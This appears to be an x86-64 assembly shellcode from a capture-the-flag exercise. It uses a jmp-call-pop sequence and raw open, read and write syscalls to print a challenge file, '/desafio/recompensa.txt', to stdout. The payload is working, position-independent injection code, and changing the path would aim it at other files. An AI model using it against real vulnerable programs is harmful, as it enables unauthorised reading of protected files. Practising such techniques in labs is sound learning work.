.intel_syntax noprefix
.global _start

.section .text

_start:
    jmp filename

open_file:
    pop rdi
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall

    mov r8d, eax
    sub rsp, 256

    mov edi, r8d
    mov rsi, rsp
    mov edx, 256
    xor eax, eax
    syscall

    mov edx, eax
    mov edi, 1
    mov rsi, rsp
    mov eax, 1
    syscall

    mov eax, 60
    xor edi, edi
    syscall

filename:
    call open_file
    .string "/desafio/recompensa.txt"
